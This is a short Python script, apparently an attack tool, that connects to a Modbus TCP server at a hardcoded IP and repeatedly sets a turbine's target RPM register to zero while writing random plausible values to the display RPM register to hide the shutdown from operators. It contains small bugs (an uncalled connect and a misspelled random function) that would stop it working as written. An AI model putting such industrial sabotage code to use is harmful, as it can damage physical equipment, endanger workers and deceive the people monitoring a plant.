from pymodbus.client.sync import ModbusTcpClient as ModbusClient
import random

def main():
    print("Connecting...")
    client = ModbusClient('111.220.27.216',5020)
    client. connect
    print("\r    Connected!")
    print("DDOSing modbus...")
    print("Attacking target rpm and display rpm...")
    try:
        while True:
            #change the target RPM to zero to stop turbine running
            client.write_register(0,0,unit=0)
            #change the display RPM to a variable ammount, to mask the attack
            randNum = random.radnint(80,110)#edit these ammounts to change the variation
            client.write_register(2,randNum,unit=0)
    except:
        print("Exiting")
if __name__=="__main__":
    main()
